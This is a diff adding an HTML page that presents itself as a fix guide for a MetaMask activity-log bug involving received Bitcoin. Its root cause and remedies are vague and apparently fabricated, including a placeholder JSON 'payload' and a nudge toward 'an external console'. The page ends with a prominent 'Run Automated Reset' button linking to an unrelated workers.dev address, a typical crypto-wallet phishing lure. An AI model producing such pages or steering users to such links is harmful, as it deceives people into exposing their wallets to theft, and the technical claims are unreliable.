@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Activity Received Btc Always Displays Fr – Fix Guide</title>
+<style>
+    body {
+        font-family: system-ui;
+        background: #121214;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff7b2c; }
+    .btn {
+        background: #00adb5;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Activity Received Btc Always Displays Fr</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem notice that when they receive Bitcoin (BTC), the activity log always displays "From: Unknown" instead of the actual sender's address.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>This error occurs due to a bug in the Metamask extension's handling of cross-chain transactions, specifically those involving Bitcoin. The extension fails to properly resolve and display the sender's address for BTC transactions.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>Attempt to refresh the activity log by restarting the browser or reinstalling the Metamask extension.</li>
+<li>Use the following JSON payload to manually update the transaction metadata:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;transactionHash&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...transaction_hash...&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;from&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;sender_address&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>Utilize the Ethereum blockchain explorer to verify the transaction details and manually extract the sender's address.</li>
+</ul>
+<p>Prerequisites:
+* Metamask extension installed and configured
+* Ethereum wallet with BTC receiving capabilities
+* Basic understanding of blockchain transactions</p>
+<p>Consider utilizing an external console for further debugging and transaction analysis to resolve the issue.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/java-tron-tron-ethcall-returns-cpu-timeout-for-contract-view-fu.html">Java Tron Tron Ethcall Returns Cpu Timeout For Contract View Fu</a></li><li><a href="./archive/2026/06/metamask-extension-bug-send-after-sending-a-tx-with-a-hw-we-lan.html">Metamask Extension Bug Send After Sending A Tx With A Hw We Lan</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
